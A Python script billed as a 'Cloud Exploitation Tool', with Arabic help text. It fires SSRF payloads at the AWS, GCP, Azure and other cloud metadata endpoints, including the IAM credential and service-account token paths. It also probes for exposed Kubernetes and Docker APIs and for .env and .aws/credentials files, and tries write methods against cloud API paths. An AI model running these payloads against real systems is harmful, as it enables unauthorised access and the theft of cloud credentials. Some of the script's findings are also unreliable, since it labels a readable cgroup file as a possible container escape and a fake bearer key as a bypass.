#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import urllib3
import concurrent.futures
import argparse
import sys
import os
import json
import base64
import socket
from datetime import datetime
from urllib.parse import urljoin, urlparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    RESET = '\033[0m'

class CloudExploits:
    def __init__(self, target, threads=10):
        self.target = target
        self.threads = threads
        self.results = []
        self.vulnerable_urls = []
        self.total_scanned = 0
        self.vulnerabilities_found = 0
        self.cloud_provider = None
        self.metadata_endpoints = []
        
    def log_result(self, url, status, details="", severity="INFO"):
        timestamp = datetime.now().strftime("%H:%M:%S")
        if "CRITICAL" in status or severity == "CRITICAL":
            print(f"{Colors.RED}[{timestamp}] [CRITICAL] {url} - {details}{Colors.RESET}")
            self.vulnerabilities_found += 1
        elif "HIGH" in status or severity == "HIGH":
            print(f"{Colors.YELLOW}[{timestamp}] [HIGH] {url} - {details}{Colors.RESET}")
            self.vulnerabilities_found += 1
        elif "VULNERABLE" in status:
            print(f"{Colors.GREEN}[{timestamp}] [VULN] {url}{Colors.RESET}")
            self.vulnerable_urls.append(url)
            self.vulnerabilities_found += 1
        elif "ERROR" in status:
            print(f"{Colors.RED}[{timestamp}] [ERROR] {url} - {details}{Colors.RESET}")
        elif "POTENTIAL" in status:
            print(f"{Colors.YELLOW}[{timestamp}] [POTENTIAL] {url} - {details}{Colors.RESET}")
        else:
            print(f"{Colors.BLUE}[{timestamp}] [SCAN] {url}{Colors.RESET}")
        
        self.results.append({
            'timestamp': timestamp,
            'url': url,
            'status': status,
            'details': details,
            'severity': severity
        })
        self.total_scanned += 1

    def detect_cloud_provider(self):
        """Detect cloud provider based on domain and headers"""
        try:
            # AWS detection patterns
            aws_patterns = [
                'amazonaws.com', 's3.amazonaws.com', 'ec2.amazonaws.com',
                'elasticbeanstalk.com', 'cloudfront.net', 'awsstatic.com',
                'elastic.co'
            ]
            
            # Azure detection patterns
            azure_patterns = [
                'azurewebsites.net', 'cloudapp.azure.com', 'blob.core.windows.net',
                'database.windows.net', 'azure-api.net', 'azureedge.net'
            ]
            
            # GCP detection patterns
            gcp_patterns = [
                'appspot.com', 'googleapis.com', 'cloudfunctions.net',
                'run.app', 'firebaseapp.com', 'cloud.google.com'
            ]
            
            target_lower = self.target.lower()
            
            for pattern in aws_patterns:
                if pattern in target_lower:
                    self.cloud_provider = "AWS"
                    self.log_result(self.target, "DETECTED", f"AWS Cloud Provider detected via domain pattern: {pattern}", "INFO")
                    return "AWS"
            
            for pattern in azure_patterns:
                if pattern in target_lower:
                    self.cloud_provider = "Azure"
                    self.log_result(self.target, "DETECTED", f"Azure Cloud Provider detected via domain pattern: {pattern}", "INFO")
                    return "Azure"
            
            for pattern in gcp_patterns:
                if pattern in target_lower:
                    self.cloud_provider = "GCP"
                    self.log_result(self.target, "DETECTED", f"GCP Cloud Provider detected via domain pattern: {pattern}", "INFO")
                    return "GCP"
            
            # Check response headers for cloud indicators
            try:
                response = requests.get(f"http://{self.target}", timeout=5, verify=False)
                
                # AWS headers
                aws_headers = ['x-amz-request-id', 'x-amz-id-2', 'x-amz-cf-id']
                for header in aws_headers:
                    if header in response.headers:
                        self.cloud_provider = "AWS"
                        self.log_result(self.target, "DETECTED", f"AWS Cloud Provider detected via header: {header}", "INFO")
                        return "AWS"
                
                # Azure headers
                azure_headers = ['x-ms-request-id', 'x-ms-version']
                for header in azure_headers:
                    if header in response.headers:
                        self.cloud_provider = "Azure"
                        self.log_result(self.target, "DETECTED", f"Azure Cloud Provider detected via header: {header}", "INFO")
                        return "Azure"
                
                # GCP headers
                gcp_headers = ['x-goog-generation', 'x-goog-hash']
                for header in gcp_headers:
                    if header in response.headers:
                        self.cloud_provider = "GCP"
                        self.log_result(self.target, "DETECTED", f"GCP Cloud Provider detected via header: {header}", "INFO")
                        return "GCP"
                        
            except:
                pass
                
            self.log_result(self.target, "UNKNOWN", "Cloud provider could not be detected", "INFO")
            return "Unknown"
            
        except Exception as e:
            self.log_result(self.target, "ERROR", f"Cloud provider detection failed: {str(e)}", "ERROR")
            return "Unknown"

    def exploit_aws_metadata(self):
        """Exploit AWS metadata service vulnerabilities"""
        if self.cloud_provider != "AWS":
            return
            
        print(f"{Colors.CYAN}[*] Testing AWS metadata service exploitation...{Colors.RESET}")
        
        # AWS metadata endpoints
        aws_metadata_endpoints = [
            'http://169.254.169.254/latest/meta-data/',
            'http://169.254.169.254/latest/user-data/',
            'http://169.254.169.254/latest/dynamic/instance-identity/',
            'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
            'http://169.254.169.254/latest/meta-data/public-ipv4',
            'http://169.254.169.254/latest/meta-data/local-ipv4',
            'http://169.254.169.254/latest/meta-data/instance-id',
            'http://169.254.169.254/latest/meta-data/ami-id',
            'http://169.254.169.254/latest/meta-data/hostname'
        ]
        
        # SSRF payloads for AWS metadata
        ssrf_payloads = [
            'http://169.254.169.254/latest/meta-data/',
            'http://metadata.google.internal/computeMetadata/v1/',
            'http://instance-data/latest/meta-data/',
            'http://[fd00:ec2::254]/latest/meta-data/',
            'http://aws.amazon.com///169.254.169.254/latest/meta-data/'
        ]
        
        # Test direct metadata access (if running on AWS instance)
        for endpoint in aws_metadata_endpoints[:3]:  # Test most critical first
            try:
                response = requests.get(endpoint, timeout=3, verify=False)
                if response.status_code == 200 and len(response.text) > 10:
                    self.log_result(endpoint, "VULNERABLE - AWS Metadata Exposed", 
                                  f"Direct metadata access possible: {response.text[:100]}...", "CRITICAL")
                    self.metadata_endpoints.append(endpoint)
            except:
                pass
        
        # Test SSRF-based metadata access
        common_params = ['url', 'link', 'redirect', 'return', 'callback', 'next', 'target', 'dest']
        
        for payload in ssrf_payloads:
            for param in common_params:
                test_url = f"http://{self.target}?{param}={payload}"
                try:
                    response = requests.get(test_url, timeout=8, verify=False)
                    
                    # Check for metadata indicators in response
                    if response.status_code == 200:
                        response_text = response.text.lower()
                        metadata_indicators = [
                            'ami-', 'instance-id', 'public-ipv4', 'security-credentials',
                            'accountid', 'user-data', 'placement/', 'block-device-mapping'
                        ]
                        
                        for indicator in metadata_indicators:
                            if indicator in response_text:
                                self.log_result(test_url, "VULNERABLE - SSRF to AWS Metadata", 
                                              f"Parameter {param} leaked AWS metadata containing {indicator}", "CRITICAL")
                                break
                                
                except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                    pass
                except Exception:
                    pass

    def exploit_gcp_metadata(self):
        """Exploit GCP metadata service vulnerabilities"""
        if self.cloud_provider != "GCP":
            return
            
        print(f"{Colors.CYAN}[*] Testing GCP metadata service exploitation...{Colors.RESET}")
        
        # GCP metadata endpoints
        gcp_metadata_endpoints = [
            'http://metadata.google.internal/computeMetadata/v1/',
            'http://metadata.google.internal/computeMetadata/v1/instance/',
            'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/',
            'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
            'http://metadata.google.internal/computeMetadata/v1/instance/attributes/',
            'http://metadata.google.internal/computeMetadata/v1/project/project-id'
        ]
        
        # Required header for GCP metadata
        headers = {'Metadata-Flavor': 'Google'}
        
        # Test direct metadata access
        for endpoint in gcp_metadata_endpoints[:2]:  # Test most critical first
            try:
                response = requests.get(endpoint, headers=headers, timeout=3, verify=False)
                if response.status_code == 200 and len(response.text) > 5:
                    self.log_result(endpoint, "VULNERABLE - GCP Metadata Exposed", 
                                  f"Direct metadata access possible: {response.text[:100]}...", "CRITICAL")
                    self.metadata_endpoints.append(endpoint)
            except:
                pass
        
        # Test SSRF-based GCP metadata access
        common_params = ['url', 'link', 'redirect', 'return', 'callback']
        
        for endpoint in gcp_metadata_endpoints:
            for param in common_params:
                # Test with metadata header via SSRF
                test_url = f"http://{self.target}?{param}={endpoint}"
                try:
                    response = requests.get(test_url, timeout=8, verify=False)
                    
                    if response.status_code == 200:
                        response_text = response.text.lower()
                        gcp_indicators = [
                            'computeMetadata', 'service-accounts', 'access_token', 
                            'project-id', 'instance-id', 'kube-env'
                        ]
                        
                        for indicator in gcp_indicators:
                            if indicator in response_text:
                                self.log_result(test_url, "VULNERABLE - SSRF to GCP Metadata", 
                                              f"Parameter {param} leaked GCP metadata containing {indicator}", "CRITICAL")
                                break
                                
                except:
                    pass

    def exploit_azure_metadata(self):
        """Exploit Azure metadata service vulnerabilities"""
        if self.cloud_provider != "Azure":
            return
            
        print(f"{Colors.CYAN}[*] Testing Azure metadata service exploitation...{Colors.RESET}")
        
        # Azure metadata endpoints
        azure_metadata_endpoints = [
            'http://169.254.169.254/metadata/instance/',
            'http://169.254.169.254/metadata/instance/compute/',
            'http://169.254.169.254/metadata/instance/network/',
            'http://169.254.169.254/metadata/instance/compute/vmScaleSetName',
            'http://169.254.169.254/metadata/instance/compute/resourceGroupName'
        ]
        
        # Required header for Azure metadata
        headers = {'Metadata': 'true'}
        
        # Test direct metadata access
        for endpoint in azure_metadata_endpoints[:2]:  # Test most critical first
            try:
                response = requests.get(endpoint, headers=headers, timeout=3, verify=False)
                if response.status_code == 200 and len(response.text) > 10:
                    self.log_result(endpoint, "VULNERABLE - Azure Metadata Exposed", 
                                  f"Direct metadata access possible: {response.text[:100]}...", "CRITICAL")
                    self.metadata_endpoints.append(endpoint)
            except:
                pass
        
        # Test SSRF-based Azure metadata access
        common_params = ['url', 'link', 'redirect', 'return', 'callback']
        
        for endpoint in azure_metadata_endpoints:
            for param in common_params:
                test_url = f"http://{self.target}?{param}={endpoint}"
                try:
                    response = requests.get(test_url, timeout=8, verify=False)
                    
                    if response.status_code == 200:
                        response_text = response.text.lower()
                        azure_indicators = [
                            'compute', 'network', 'vmScaleSetName', 'resourceGroupName',
                            'subscriptionId', 'location', 'vmSize'
                        ]
                        
                        for indicator in azure_indicators:
                            if indicator in response_text:
                                self.log_result(test_url, "VULNERABLE - SSRF to Azure Metadata", 
                                              f"Parameter {param} leaked Azure metadata containing {indicator}", "CRITICAL")
                                break
                                
                except:
                    pass

    def exploit_cloud_storage(self):
        """Exploit cloud storage misconfigurations"""
        print(f"{Colors.CYAN}[*] Testing cloud storage exploitation...{Colors.RESET}")
        
        # Common cloud storage endpoints
        storage_endpoints = [
            '/s3', '/s3-bucket', '/storage', '/files', '/uploads', '/assets',
            '/images', '/documents', '/media', '/content', '/data'
        ]
        
        # Test S3 bucket misconfigurations
        if self.cloud_provider == "AWS" or not self.cloud_provider:
            s3_payloads = [
                'https://s3.amazonaws.com/',
                'https://s3-us-east-1.amazonaws.com/',
                'http://s3.amazonaws.com/',
                's3://bucket-name/',
                's3://public-bucket/'
            ]
            
            for endpoint in storage_endpoints:
                for payload in s3_payloads:
                    test_url = f"http://{self.target}{endpoint}?url={payload}"
                    try:
                        response = requests.get(test_url, timeout=5, verify=False)
                        if response.status_code == 200:
                            self.log_result(test_url, "POTENTIAL - S3 Storage Access", 
                                          f"S3 bucket access possible via {endpoint}", "MEDIUM")
                    except:
                        pass
        
        # Test Azure Blob storage
        if self.cloud_provider == "Azure" or not self.cloud_provider:
            azure_storage_payloads = [
                'https://blob.core.windows.net/',
                'https://storageaccount.blob.core.windows.net/',
                'azure-blob://container/'
            ]
            
            for endpoint in storage_endpoints:
                for payload in azure_storage_payloads:
                    test_url = f"http://{self.target}{endpoint}?url={payload}"
                    try:
                        response = requests.get(test_url, timeout=5, verify=False)
                        if response.status_code == 200:
                            self.log_result(test_url, "POTENTIAL - Azure Storage Access", 
                                          f"Azure blob storage access possible via {endpoint}", "MEDIUM")
                    except:
                        pass

    def exploit_cloud_apis(self):
        """Exploit cloud API vulnerabilities"""
        print(f"{Colors.CYAN}[*] Testing cloud API exploitation...{Colors.RESET}")
        
        # Common cloud API endpoints
        cloud_api_endpoints = [
            '/api/cloud', '/api/aws', '/api/azure', '/api/gcp',
            '/cloud/api', '/aws/api', '/azure/api', '/gcp/api',
            '/api/v1/cloud', '/api/v1/aws', '/api/v1/azure', '/api/v1/gcp',
            '/api/cloud/config', '/api/cloud/credentials', '/api/cloud/buckets',
            '/cloud/config', '/cloud/metadata', '/cloud/services'
        ]
        
        # Test for excessive permissions in cloud APIs
        for endpoint in cloud_api_endpoints:
            url = f"http://{self.target}{endpoint}"
            try:
                # Test GET access
                response = requests.get(url, timeout=5, verify=False)
                if response.status_code == 200:
                    self.log_result(url, "POTENTIAL - Cloud API Exposed", 
                                  f"Cloud API endpoint accessible: {endpoint}", "HIGH")
                    
                    # Test for sensitive data exposure
                    response_text = response.text.lower()
                    sensitive_patterns = [
                        'access_key', 'secret_key', 'api_key', 'token',
                        'password', 'credential', 'aws_access', 'azure_account',
                        'gcp_key', 'private_key', 'connection_string'
                    ]
                    
                    for pattern in sensitive_patterns:
                        if pattern in response_text:
                            self.log_result(url, "CRITICAL - Cloud Credentials Exposed", 
                                          f"Sensitive cloud credentials detected: {pattern}", "CRITICAL")
                            break
                
                # Test for excessive HTTP methods
                methods = ['POST', 'PUT', 'DELETE', 'PATCH']
                for method in methods:
                    try:
                        method_response = requests.request(method, url, timeout=3, verify=False)
                        if method_response.status_code in [200, 201, 202, 204]:
                            self.log_result(url, f"HIGH - Cloud API allows {method}", 
                                          f"Excessive HTTP method {method} allowed on cloud API", "HIGH")
                    except:
                        pass
                        
            except:
                pass
    
    def exploit_kubernetes_apis(self):
        """Exploit Kubernetes API vulnerabilities"""
        print(f"{Colors.CYAN}[*] Testing Kubernetes API exploitation...{Colors.RESET}")
        
        # Kubernetes API endpoints
        k8s_endpoints = [
            '/api/v1', '/api/v1/namespaces', '/api/v1/pods',
            '/apis/apps/v1', '/apis/apps/v1/deployments',
            '/apis/batch/v1', '/apis/batch/v1/jobs',
            '/api/v1/services', '/api/v1/configmaps',
            '/api/v1/secrets', '/api/v1/nodes',
            '/kubernetes/api', '/k8s/api', '/kube/api'
        ]
        
        # Common Kubernetes ports
        k8s_ports = [6443, 8080, 10250, 10255, 10256, 30000, 443]
        
        for endpoint in k8s_endpoints:
            url = f"http://{self.target}{endpoint}"
            try:
                response = requests.get(url, timeout=5, verify=False)
                if response.status_code == 200:
                    # Check for Kubernetes API response
                    if 'apiVersion' in response.text and 'kind' in response.text:
                        self.log_result(url, "CRITICAL - Kubernetes API Exposed", 
                                      f"Kubernetes API accessible: {endpoint}", "CRITICAL")
                        
                        # Check for cluster information exposure
                        try:
                            json_data = response.json()
                            if 'items' in json_data and len(json_data['items']) > 0:
                                self.log_result(url, "CRITICAL - Kubernetes Resources Exposed", 
                                              f"Cluster resources visible: {len(json_data['items'])} items", "CRITICAL")
                        except:
                            pass
                    else:
                        self.log_result(url, "POTENTIAL - Possible Kubernetes API", 
                                      f"Potential Kubernetes endpoint: {endpoint}", "MEDIUM")
                        
            except:
                pass
        
        # Test Kubernetes dashboard
        dashboard_endpoints = ['/dashboard', '/kubernetes-dashboard', '/k8s-dashboard', '/ui']
        for endpoint in dashboard_endpoints:
            url = f"http://{self.target}{endpoint}"
            try:
                response = requests.get(url, timeout=5, verify=False)
                if response.status_code == 200:
                    if 'kubernetes' in response.text.lower() or 'dashboard' in response.text.lower():
                        self.log_result(url, "HIGH - Kubernetes Dashboard Exposed", 
                                      f"Kubernetes dashboard accessible: {endpoint}", "HIGH")
            except:
                pass
    
    def exploit_container_vulnerabilities(self):
        """Exploit container and Docker vulnerabilities"""
        print(f"{Colors.CYAN}[*] Testing container exploitation...{Colors.RESET}")
        
        # Docker API endpoints
        docker_endpoints = [
            '/version', '/info', '/containers/json', '/images/json',
            '/containers/create', '/containers/{id}/start', '/containers/{id}/stop',
            '/docker', '/docker-api', '/docker/api', '/docker/version'
        ]
        
        # Container runtime endpoints
        container_endpoints = [
            '/container', '/containers', '/pod', '/pods', '/runtime', '/cri'
        ]
        
        for endpoint in docker_endpoints:
            url = f"http://{self.target}{endpoint}"
            try:
                response = requests.get(url, timeout=5, verify=False)
                if response.status_code == 200:
                    # Check for Docker API response
                    if 'ApiVersion' in response.text or 'docker' in response.text.lower():
                        self.log_result(url, "CRITICAL - Docker API Exposed", 
                                      f"Docker API accessible: {endpoint}", "CRITICAL")
                        
                        # Check for container information
                        try:
                            json_data = response.json()
                            if 'Containers' in json_data or 'Images' in json_data:
                                self.log_result(url, "CRITICAL - Docker Resources Exposed", 
                                              f"Docker resources visible: containers/images data", "CRITICAL")
                        except:
                            pass
                            
            except:
                pass
        
        # Test for container escape vulnerabilities
        escape_payloads = [
            '/proc/self/cgroup', '/proc/1/cgroup', '/sys/fs/cgroup',
            '/.dockerenv', '/proc/self/mountinfo', '/etc/hostname'
        ]
        
        for payload in escape_payloads:
            url = f"http://{self.target}{payload}"
            try:
                response = requests.get(url, timeout=3, verify=False)
                if response.status_code == 200:
                    if 'docker' in response.text.lower() or 'container' in response.text.lower():
                        self.log_result(url, "HIGH - Container Environment Detected", 
                                      f"Container escape possible: {payload}", "HIGH")
            except:
                pass
        
        # Test with common cloud API keys
        cloud_api_keys = [
            'AWS_ACCESS_KEY_ID',
            'AWS_SECRET_ACCESS_KEY', 
            'AZURE_SUBSCRIPTION_ID',
            'GOOGLE_APPLICATION_CREDENTIALS'
        ]
        
        for key_name in cloud_api_keys:
            headers = {'Authorization': f'Bearer {key_name}-test-key'}
            try:
                response = requests.get(url, headers=headers, timeout=5, verify=False)
                if response.status_code == 200:
                    self.log_result(url, "VULNERABLE - Cloud API Key Bypass", 
                                  f"API key bypass possible with {key_name}", "HIGH")
            except:
                pass

    def run_all_exploits(self):
        """Run all cloud exploitation tests"""
        print(f"{Colors.CYAN}[*] Starting comprehensive cloud exploitation scan...{Colors.RESET}")
        print(f"{Colors.CYAN}[*] Target: {self.target}{Colors.RESET}")
        
        # Detect cloud provider first
        self.detect_cloud_provider()
        
        # Run provider-specific exploits
        self.exploit_aws_metadata()
        self.exploit_gcp_metadata()
        self.exploit_azure_metadata()
        
        # Run general cloud exploits
        self.exploit_cloud_storage()
        self.exploit_cloud_apis()
        self.exploit_container_vulnerabilities()
        self.exploit_kubernetes_apis()
        self.exploit_advanced_ssrf()
        self.exploit_serverless_vulnerabilities()
        
        print(f"\n{Colors.GREEN}[+] Cloud exploitation scan completed!{Colors.RESET}")
        print(f"{Colors.GREEN}[+] Total vulnerabilities found: {self.vulnerabilities_found}{Colors.RESET}")
        
        return self.generate_report()
    
    def exploit_advanced_ssrf(self):
        """Advanced SSRF exploitation techniques"""
        print(f"{Colors.CYAN}[*] Testing advanced SSRF vulnerabilities...{Colors.RESET}")
        
        # Advanced SSRF payloads for cloud metadata
        advanced_ssrf_payloads = [
            # AWS advanced payloads
            'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
            'http://169.254.169.254/latest/user-data/',
            'http://instance-data/latest/meta-data/',
            'http://[fd00:ec2::254]/latest/meta-data/',
            
            # GCP advanced payloads
            'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
            'http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys',
            
            # Azure advanced payloads
            'http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-02-01',
            'http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/privateIpAddress?api-version=2021-02-01',
            
            # Generic cloud metadata
            'http://metadata.tencentyun.com/latest/meta-data/',
            'http://metadata.tencentyun.com/latest/meta-data/placement/region',
            'http://100.100.100.200/latest/meta-data/'
        ]
        
        # SSRF parameter variations
        ssrf_parameters = [
            'url', 'link', 'redirect', 'return', 'callback', 'next', 'target', 'dest',
            'uri', 'path', 'file', 'page', 'site', 'domain', 'host', 'ip',
            'to', 'from', 'href', 'src', 'location', 'address', 'endpoint'
        ]
        
        # Test each parameter with each payload
        for param in ssrf_parameters:
            for payload in advanced_ssrf_payloads:
                test_url = f"http://{self.target}?{param}={payload}"
                try:
                    response = requests.get(test_url, timeout=8, verify=False)
                    
                    if response.status_code == 200 and len(response.text) > 50:
                        # Check for metadata indicators
                        metadata_indicators = [
                            'ami-', 'instance-id', 'accountId', 'AccessKeyId',
                            'SecretAccessKey', 'Token', 'computeMetadata',
                            'service-accounts', 'vmScaleSetName', 'subscriptionId'
                        ]
                        
                        response_text = response.text
                        for indicator in metadata_indicators:
                            if indicator in response_text:
                                self.log_result(test_url, "CRITICAL - Advanced SSRF to Cloud Metadata", 
                                              f"Parameter {param} leaked cloud metadata containing {indicator}", "CRITICAL")
                                break
                                
                except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                    pass
                except Exception:
                    pass
    
    def exploit_serverless_vulnerabilities(self):
        """Exploit serverless function vulnerabilities"""
        print(f"{Colors.CYAN}[*] Testing serverless function vulnerabilities...{Colors.RESET}")
        
        # Serverless function endpoints
        serverless_endpoints = [
            '/.aws', '/.lambda', '/lambda', '/function', '/functions',
            '/.azure', '/.functionapp', '/api/function', '/azure-function',
            '/.gcp', '/.cloudfunction', '/cloudfunction', '/cloud-function',
            '/.netlify', '/.vercel', '/.now', '/serverless', '/faas'
        ]
        
        # Serverless environment variables
        env_endpoints = [
            '/.env', '/env', '/environment', '/vars', '/variables',
            '/config', '/settings', '/.aws/credentials', '/.gcp/key'
        ]
        
        for endpoint in serverless_endpoints:
            url = f"http://{self.target}{endpoint}"
            try:
                response = requests.get(url, timeout=5, verify=False)
                if response.status_code == 200:
                    response_text = response.text.lower()
                    
                    # Check for serverless indicators
                    serverless_indicators = [
                        'lambda', 'function', 'serverless', 'faas', 'runtime',
                        'handler', 'aws', 'azure', 'gcp', 'cloudfunction'
                    ]
                    
                    for indicator in serverless_indicators:
                        if indicator in response_text:
                            self.log_result(url, "HIGH - Serverless Function Exposed", 
                                          f"Serverless function detected: {indicator}", "HIGH")
                            break
                            
            except:
                pass
        
        # Test for serverless environment exposure
        for endpoint in env_endpoints:
            url = f"http://{self.target}{endpoint}"
            try:
                response = requests.get(url, timeout=5, verify=False)
                if response.status_code == 200:
                    # Check for sensitive environment variables
                    env_indicators = [
                        'aws_access_key_id', 'aws_secret_access_key', 'azure_client_id',
                        'gcp_project_id', 'database_url', 'api_key', 'secret_key',
                        'token', 'password', 'private_key'
                    ]
                    
                    response_text = response.text.lower()
                    for indicator in env_indicators:
                        if indicator in response_text:
                            self.log_result(url, "CRITICAL - Serverless Environment Variables Exposed", 
                                          f"Sensitive environment variable detected: {indicator}", "CRITICAL")
                            break
                            
            except:
                pass

    def generate_report(self):
        """Generate detailed cloud exploitation report"""
        report_file = f"cloud_exploitation_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        
        report_data = {
            'scan_metadata': {
                'target': self.target,
                'cloud_provider': self.cloud_provider,
                'scan_date': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'total_vulnerabilities': self.vulnerabilities_found,
                'total_scanned': self.total_scanned
            },
            'vulnerabilities': self.results,
            'metadata_endpoints': self.metadata_endpoints,
            'vulnerable_urls': self.vulnerable_urls,
            'risk_assessment': {
                'critical_count': len([r for r in self.results if r['severity'] == 'CRITICAL']),
                'high_count': len([r for r in self.results if r['severity'] == 'HIGH']),
                'medium_count': len([r for r in self.results if r['severity'] == 'MEDIUM']),
                'low_count': len([r for r in self.results if r['severity'] == 'LOW'])
            }
        }
        
        with open(report_file, 'w', encoding='utf-8') as f:
            json.dump(report_data, f, ensure_ascii=False, indent=2)
        
        print(f"{Colors.GREEN}[+] Cloud exploitation report saved to: {report_file}{Colors.RESET}")
        return report_file

def main():
    parser = argparse.ArgumentParser(description='Cloud Exploitation Tool - استغلال ثغرات خدمات السحابة')
    parser.add_argument('target', help='الهدف للفحص (مثال: example.com)')
    parser.add_argument('--threads', '-t', type=int, default=10, help='عدد مؤشرات الترابط (الافتراضي: 10)')
    
    args = parser.parse_args()
    
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)
    
    print(f"{Colors.CYAN}{Colors.BOLD}")
    print("=" * 60)
    print("        CLOUD EXPLOITATION TOOL")
    print("    أداة استغلال ثغرات خدمات السحابة")
    print("=" * 60)
    print(f"{Colors.RESET}")
    
    exploiter = CloudExploits(args.target, args.threads)
    exploiter.run_all_exploits()

if __name__ == "__main__":
    main()